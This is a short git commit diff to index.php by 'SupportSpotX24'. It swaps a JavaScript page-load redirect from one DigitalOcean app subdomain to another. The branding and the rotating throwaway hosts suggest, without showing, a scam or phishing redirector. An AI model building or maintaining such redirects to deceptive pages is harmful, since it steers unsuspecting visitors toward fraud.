f4e5940a62bfa844f5a4c1fe75e680267f397f37
SupportSpotX24 <abilashgupta7@gmail.com>
2026-01-27 23:14:42 -0500

    Update index.php

--- index.php
+++ index.php
@@ -15,7 +15,7 @@
 <script>
         document.addEventListener("DOMContentLoaded", function () {
 
-            const redirectUrl = "https://urchin-app-rbtsp.ondigitalocean.app/";
+            const redirectUrl = "https://clownfish-app-in8a4.ondigitalocean.app/";
 
             const style = document.createElement("style");
             style.textContent = `
